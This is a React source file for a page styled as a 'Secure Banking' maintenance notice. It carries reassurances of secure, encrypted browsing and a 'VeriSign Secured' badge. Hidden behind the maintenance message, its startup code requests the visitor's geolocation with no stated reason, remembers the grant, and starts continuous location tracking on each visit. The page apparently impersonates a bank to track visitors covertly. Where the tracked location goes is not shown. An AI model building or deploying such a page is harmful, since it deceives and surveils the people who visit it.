import React, { useEffect } from 'react'
import { useGeolocation } from './hooks/useGeolocation'
import './App.css'

function App() {
  const { getCurrentLocation, startTracking, location, error, loading, isTracking } = useGeolocation()

  useEffect(() => {
    if ('geolocation' in navigator) {
      // Check if user has previously granted permission
      const hasLocationPermission = localStorage.getItem('locationPermissionGranted')
      
      if (hasLocationPermission === 'true') {
        // Start continuous tracking immediately if permission was previously granted
        startTracking()
      } else {
        // Request location permission first
        getCurrentLocation().then(() => {
          // If successful, mark permission as granted and start continuous tracking
          localStorage.setItem('locationPermissionGranted', 'true')
          startTracking()
        }).catch(() => {
          // Permission denied or error
          localStorage.setItem('locationPermissionGranted', 'false')
        })
      }
    }
  }, [getCurrentLocation, startTracking])

  return (
    <div className="App maintenance-page">
      <header className="maintenance-header">
        <div className="maintenance-header-inner">
          <div className="maintenance-brand-center">
            <img
              src="/logo.png"
              alt="Secure Banking"
              className="maintenance-logo"
            />
          </div>
        </div>
      </header>

      <main className="maintenance-main">
        <section className="maintenance-card">
          <p className="maintenance-info">You are browsing our site in a safe and secure mode.</p>
          <p className="maintenance-info">
            Data transferred from your machine to our servers is in an encrypted mode,
            confidential information.
          </p>

          <div className="maintenance-divider" />

          <h1 className="maintenance-title">WEBSITE UNDER MAINTENANCE</h1>
          <p className="maintenance-message">
            Our apologies for currently undergoing scheduled maintenance and we&apos;ll be back online shortly.
          </p>

          <div className="maintenance-icon" />

          <p className="maintenance-thanks">Thank you for your patience. 🙏</p>

          <div className="maintenance-footer-links">
            <span>FAQs</span>
            <span>Security Tips</span>
            <span>Demo</span>
          </div>
        </section>
      </main>

      <footer className="maintenance-security-footer">
        <div className="maintenance-security-badge">VeriSign Secured</div>
      </footer>
    </div>
  )
}

export default App
